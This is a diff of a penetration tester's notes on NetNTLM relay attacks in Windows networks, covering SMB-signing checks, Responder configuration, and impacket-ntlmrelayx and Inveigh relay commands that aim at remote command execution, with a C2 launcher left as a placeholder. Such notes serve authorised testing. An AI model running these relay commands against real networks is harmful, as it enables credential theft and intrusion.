@@ -61,28 +61,70 @@ Invoke-Inveigh -IP <current-box-ip> -ConsoleOutput Y -NBNS Y -FileOutput Y
 Stop-Inveigh
 ```
 
-### Notes
+### NetNTLM Relay: classic
 
-NetNTLM creds relay (prereq: SMB signing needs to be turned off):
+Prereq for success: 
 
-Check: `nmap --script smb-security-mode.nse -p445,139 192.168.12.0/24 --open`
+1. SMB signing must not be enforced (i.e. one of the machines in the conversation must have `message_signing: disabled (dangerous, but default)` as a result of `nmap --script smb-security-mode -p445 192.168.12.0`)
+2. For optimal impact (i.e. RCE) owner of the credetnials that are being relayed must have Local Admin privileges on target machine
 
-With Inveigh (provides NTLMv1/NTLMv2 HTTP/HTTPS/Proxy to SMB2.1 relay):
+### With Responder + impacket's ntlmrealyx/smbrealyx
+
+In `Responder.conf`:
+
+```
+; Servers to start
+SQL = Off
+SMB = Off
+RDP = Off
+Kerberos = Off
+FTP = Off
+POP = Off
+SMTP = Off
+IMAP = Off
+HTTP = Off
+HTTPS = Off
+DNS = Off
+LDAP = Off
+```
+
+Start responder: 
+
+    responder -I eth0 -f -v`
+
+Start ntlmrelayx:
+
+    impacket-ntlmrelayx -t smb://<ip-to-relay-to> --enum-local-admins -smb2support
+
+Reference:
+
+    https://threat.tevora.com/quick-tip-skip-cracking-responder-hashes-and-replay-them/
+    https://speakerdeck.com/ropnop/fun-with-ldap-kerberos-and-msrpc-in-ad-environments
+
+### With Inveigh 
+
+Capabilities:
+
+NTLMv1/NTLMv2 HTTP/HTTPS/Proxy -> SMB2.1 relay
+
+Procedure:
 
 ```
 # we don't launch listener on HTTP as Invoke-InveighRelay will listen on it
 Invoke-Inveigh -IP <current-box-ip> -ConsoleOutput Y -NBNS Y -LLMNR Y -mDNS Y -HTTP N
 
 # Prepare command to execute (e.g. launcher for C2 Empire):
-see below: Empire as C&C
+TODO
 
 # launch Relay (as cmd provide launcher command form Empire):
 Invoke-InveighRelay -ConsoleOutput Y -StatusOutput N -Target <ip-to-relay-to> -Command <cmd-to-execute>
 ```
 
-With Responder:
+### NetNTLM Relay: IPv6 DNS server impersonation (mitm6)
 
-    https://threat.tevora.com/quick-tip-skip-cracking-responder-hashes-and-replay-them/
+    https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/
+
+### Notes
 
 Other tools:
 
